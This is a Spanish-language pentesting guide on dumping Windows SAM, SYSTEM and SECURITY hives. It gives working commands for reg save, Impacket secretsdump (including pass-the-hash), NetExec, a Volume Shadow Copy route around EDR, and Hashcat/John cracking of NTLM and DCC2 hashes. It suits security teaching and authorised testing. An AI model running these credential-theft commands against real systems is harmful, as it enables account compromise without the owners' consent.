# Ataque a SAM, SYSTEM y SECURITY

La base de datos SAM almacena los hashes NT de todas las cuentas locales de Windows. Está protegida por el kernel mientras el sistema está activo (no puede copiarse directamente), pero existen múltiples vías para extraerla: mediante el registro, desde un sistema offline o usando Volume Shadow Copies.

### Estructura de los archivos

Los tres archivos relevantes están en `C:\Windows\System32\config\`:

* `SAM` — contiene los hashes NT de las cuentas locales, cifrados con la boot key
* `SYSTEM` — contiene la boot key (SYSKEY) necesaria para descifrar SAM
* `SECURITY` — contiene credenciales cacheadas (Domain Cached Credentials) y secretos LSA

> SAM sin SYSTEM es inútil. Siempre hay que exfiltrar ambos juntos para poder descifrar los hashes.

### Extracción mediante reg save (requiere privilegios locales)

Desde una shell con privilegios de administrador local o SYSTEM:

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

Después se exfiltran los tres ficheros y se procesan offline.

### Extracción con Impacket — secretsdump

`secretsdump.py` de Impacket puede procesar los archivos localmente o conectarse remotamente con credenciales de administrador:

```bash
# Offline — procesar archivos extraídos
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Remoto — con credenciales de admin local
impacket-secretsdump administrador:Password123@192.168.1.10

# Remoto — con hash NTLM (Pass-the-Hash)
impacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee:hash_nt administrador@192.168.1.10
```

Salida típica:

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

El valor `aad3b435b51404eeaad3b435b51404ee` es el hash LM vacío (indica que LM está desactivado).

### Extracción con CrackMapExec / NetExec

```bash
netexec smb 192.168.1.10 -u administrador -p Password123 --sam
netexec smb 192.168.1.10 -u administrador -p Password123 --lsa   # secretos LSA
```

### Volume Shadow Copies

Si `reg save` está bloqueado por EDR, las VSS permiten acceder a los archivos del sistema sin restricciones del kernel:

```cmd
# Listar shadow copies disponibles
vssadmin list shadows

# Crear una nueva si no hay
vssadmin create shadow /for=C:

# Copiar SAM desde la shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

### Cracking de los hashes extraídos

```bash
# Con Hashcat — modo NTLM
hashcat -m 1000 sam_hashes.txt rockyou.txt -r best64.rule

# Con John
john sam_hashes.txt --format=NT --wordlist=rockyou.txt
```

### Domain Cached Credentials (DCC2)

`SECURITY` contiene los hashes de las últimas cuentas de dominio que iniciaron sesión localmente (por defecto, las últimas 10). Permiten login offline cuando el DC no está disponible. Son hashes DCC2 (MS-Cache v2), mucho más lentos de crackear que NTLM:

```bash
# Hashcat modo DCC2
hashcat -m 2100 dcc2_hashes.txt rockyou.txt
```

> DCC2 no sirve para Pass-the-Hash. Solo son útiles si se descifran a plaintext. Su lentitud (PBKDF2 con iteraciones) hace que solo merezca la pena atacarlos con wordlists muy focalizadas.
